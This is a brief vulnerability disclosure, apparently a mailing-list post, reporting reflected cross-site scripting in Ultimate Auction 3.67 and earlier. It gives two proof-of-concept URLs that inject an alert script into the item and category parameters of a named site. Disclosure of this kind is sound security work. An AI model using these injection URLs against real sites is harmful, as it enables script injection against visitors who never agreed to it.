Hello!

I've found a XSS in Ultimate Auction <=3.67. The Vendor was informed mid
October 2005! They still haven't fix the script and doesn't reply to mails.

Here's a little Example:


http://www.ultimate-auction.de/cgi-local/auktion/item.pl/item.pl?item=<script>alert("XSS")</script>
http://www.ultimate-auction.de/cgi-local/auktion/itemlist.pl?category=<script>alert("XSS")</script>

The bug has the BID 16239
